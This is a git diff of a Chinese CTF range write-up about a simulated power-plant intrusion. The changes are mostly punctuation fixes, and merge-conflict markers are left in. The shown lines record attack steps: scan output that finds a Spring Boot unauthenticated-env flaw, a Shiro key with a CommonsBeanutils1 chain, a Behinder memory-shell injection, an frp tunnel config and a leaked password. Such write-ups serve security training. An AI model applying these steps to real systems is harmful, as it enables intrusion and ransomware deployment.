@@ -17,7 +17,7 @@ tags:
 
 title: ThermalPower  
 <<<<<<< HEAD
-description: 该场景模拟仿真了电力生产企业的部分业务场景。“火创能源” 公司在未充分重视网络安全的威胁的情况下，将敏感区域的服务错误地配置在公网上，使得外部的 APT 组织可以轻松地访问这些服务，最终导致控制电力分配、生产流程和其他关键设备的服务遭受攻击，并部署了勒索病毒。 玩家的任务是分析 APT 组织的渗透行为，按照关卡列表恢复其攻击路径，并对勒索病毒加密的文件进行解密。
+description: 该场景模拟仿真了电力生产企业的部分业务场景。“火创能源”公司在未充分重视网络安全的威胁的情况下，将敏感区域的服务错误地配置在公网上，使得外部的 APT 组织可以轻松地访问这些服务，最终导致控制电力分配、生产流程和其他关键设备的服务遭受攻击，并部署了勒索病毒。玩家的任务是分析 APT 组织的渗透行为，按照关卡列表恢复其攻击路径，并对勒索病毒加密的文件进行解密。
 =======
 description: 该场景模拟仿真了电力生产企业的部分业务场景。“火创能源”公司在未充分重视网络安全的威胁的情况下，将敏感区域的服务错误地配置在公网上，使得外部的 APT 组织可以轻松地访问这些服务，最终导致控制电力分配、生产流程和其他关键设备的服务遭受攻击，并部署了勒索病毒。玩家的任务是分析 APT 组织的渗透行为，按照关卡列表恢复其攻击路径，并对勒索病毒加密的文件进行解密。
 >>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
@@ -122,7 +122,7 @@ start infoscan
 [*] alive ports len is: 2
 start vulscan
 <<<<<<< HEAD
-[*] WebTitle http://121.89.201.231:8080 code:302 len:0      title:None 跳转url: http://121.89.201.231:8080/login;jsessionid=007467BA1E151515820545DC6111344D
+[*] WebTitle http://121.89.201.231:8080 code:302 len:0      title:None 跳转 url: http://121.89.201.231:8080/login;jsessionid=007467BA1E151515820545DC6111344D
 =======
 [*] WebTitle http://121.89.201.231:8080 code:302 len:0      title:None 跳转 url: http://121.89.201.231:8080/login;jsessionid=007467BA1E151515820545DC6111344D
 >>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
@@ -131,7 +131,7 @@ start vulscan
 [+] PocScan http://121.89.201.231:8080 poc-yaml-springboot-env-unauth spring2
 已完成 2/2                                 
 <<<<<<< HEAD
-[*] 扫描结束,耗时: 19.0686916s
+[*] 扫描结束，耗时：19.0686916s
 =======
 [*] 扫描结束，耗时：19.0686916s
 >>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
@@ -224,8 +224,8 @@ algMode = CBC, key = QZYysgMYhG6/CzIJlVpR2g==, algName = AES
 ```plain
 URL: http://121.89.201.231:8080
 SHIRO KEY: QZYysgMYhG6/CzIJlVpR2g==
-构造链: CommonsBeanutils1  
-回显方式: AllEcho
+构造链：CommonsBeanutils1  
+回显方式：AllEcho
 ```
 
 [![](assets/1710898759-6d53fd53c873db32915f95aaf1c5c255.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104300-6802edfc-e0e3-1.png)
@@ -233,7 +233,7 @@ SHIRO KEY: QZYysgMYhG6/CzIJlVpR2g==
 注入内存马：
 
 ```plain
-冰蝎[Filter]  注入成功!
+冰蝎[Filter]  注入成功！
 =======
 ```bash
 URL: http://121.89.201.231:8080
@@ -350,7 +350,7 @@ fscan 内网信息收集：
 172.22.17.6:21 open
 172.22.17.213:22 open
 <<<<<<< HEAD
-[*] WebTitle http://172.22.17.213:8080 code:302 len:0      title:None 跳转url: http://172.22.17.213:8080/login;jsessionid=6F1E3BB703935624E3EF2C176AA6F913
+[*] WebTitle http://172.22.17.213:8080 code:302 len:0      title:None 跳转 url: http://172.22.17.213:8080/login;jsessionid=6F1E3BB703935624E3EF2C176AA6F913
 =======
 [*] WebTitle http://172.22.17.213:8080 code:302 len:0      title:None 跳转 url: http://172.22.17.213:8080/login;jsessionid=6F1E3BB703935624E3EF2C176AA6F913
 >>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
@@ -414,7 +414,7 @@ auth.token = "<YOUR-AUTH-TOKEN>"
 ```
 
 <<<<<<< HEAD
-frpc.toml：
+frpc.toml:
 
 ```plain
 =======
@@ -470,10 +470,10 @@ Password: IYnT3GyCiy3
 
 ```plain
 1. 登陆权限限制：
-   为确保信息系统的安全性，自即日起，公司所有工程师PC的登陆将由SCADA工程师进行控制。请各位工程师注意，只能通过SCADA工程师提供的登陆方式进行访问。
+   为确保信息系统的安全性，自即日起，公司所有工程师 PC 的登陆将由 SCADA 工程师进行控制。请各位工程师注意，只能通过 SCADA 工程师提供的登陆方式进行访问。
 
 2. 登陆账户设置：
-   为方便管理和标准化，登陆账户名将采用姓名全称的小写拼音形式。例如，张三的账户名为zhangsan，工号为0801。初始密码将由账户名+@+工号组成，例如，zhangsan@0801。
+   为方便管理和标准化，登陆账户名将采用姓名全称的小写拼音形式。例如，张三的账户名为 zhangsan，工号为 0801。初始密码将由账户名+@+工号组成，例如，zhangsan@0801。
 =======
 [![](assets/1710465426-6b86875cd02f4ce204d6e14f89b7ccd4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240313104324-76518382-e0e3-1.png)
 
@@ -567,50 +567,50 @@ chenhua 账号 rdp 登录：
 ```plain
 C:\Users\chenhua>systeminfo
 
-主机名:           WIN-ENGINEER
-OS 名称:          Microsoft Windows Server 2022 Datacenter
-OS 版本:          10.0.20348 暂缺 Build 20348
-OS 制造商:        Microsoft Corporation
-OS 配置:          独立服务器
-OS 构建类型:      Multiprocessor Free
-注册的所有人:
-注册的组织:       Aliyun
+主机名：WIN-ENGINEER
+OS 名称：Microsoft Windows Server 2022 Datacenter
+OS 版本：10.0.20348 暂缺 Build 20348
+OS 制造商：Microsoft Corporation
+OS 配置：独立服务器
+OS 构建类型：Multiprocessor Free
+注册的所有人：
+注册的组织：Aliyun
 产品 ID:          00454-60000-00001-AA888
-初始安装日期:     2023/12/25, 20:35:07
-系统启动时间:     2024/3/4, 13:41:17
-系统制造商:       Alibaba Cloud
-系统型号:         Alibaba Cloud ECS
-系统类型:         x64-based PC
-处理器:           安装了 1 个处理器。
+初始安装日期：2023/12/25, 20:35:07
+系统启动时间：2024/3/4, 13:41:17
+系统制造商：Alibaba Cloud
+系统型号：Alibaba Cloud ECS
+系统类型：x64-based PC
+处理器：安装了 1 个处理器。
                   [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz
-BIOS 版本:        SeaBIOS 449e491, 2014/4/1
-Windows 目录:     C:\Windows
-系统目录:         C:\Windows\system32
-启动设备:         \Device\HarddiskVolume1
-系统区域设置:     zh-cn;中文(中国)
-输入法区域设置:   zh-cn;中文(中国)
-时区:             (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐
-物理内存总量:     3,950 MB
-可用的物理内存:   2,137 MB
-虚拟内存: 最大值: 5,358 MB
-虚拟内存: 可用:   3,600 MB
-虚拟内存: 使用中: 1,758 MB
-页面文件位置:     C:\pagefile.sys
-域:               WORKGROUP
-登录服务器:       \\WIN-ENGINEER
-修补程序:         安装了 3 个修补程序。
+BIOS 版本：SeaBIOS 449e491, 2014/4/1
+Windows 目录：C:\Windows
+系统目录：C:\Windows\system32
+启动设备：        \Device\HarddiskVolume1
+系统区域设置：zh-cn;中文 (中国)
+输入法区域设置：zh-cn;中文 (中国)
+时区：            (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐
+物理内存总量：3,950 MB
+可用的物理内存：2,137 MB
+虚拟内存：最大值：5,358 MB
+虚拟内存：可用：3,600 MB
+虚拟内存：使用中：1,758 MB
+页面文件位置：C:\pagefile.sys
+域：WORKGROUP
+登录服务器：      \\WIN-ENGINEER
+修补程序：安装了 3 个修补程序。
                   [01]: KB5031993
                   [02]: KB5032198
                   [03]: KB5032310
-网卡:             安装了 1 个 NIC。
+网卡：安装了 1 个 NIC。
                   [01]: Red Hat VirtIO Ethernet Adapter
-                      连接名:      以太网
+                      连接名：以太网
                       启用 DHCP:   是
-                      DHCP 服务器: 172.22.255.253
+                      DHCP 服务器：172.22.255.253
                       IP 地址
                         [01]: 172.22.17.6
                         [02]: fe80::6ee2:423a:4d01:5191
-Hyper-V 要求:     已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。
+Hyper-V 要求：已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。
 =======
 ```bash
 C:\Users\chenhua>systeminfo
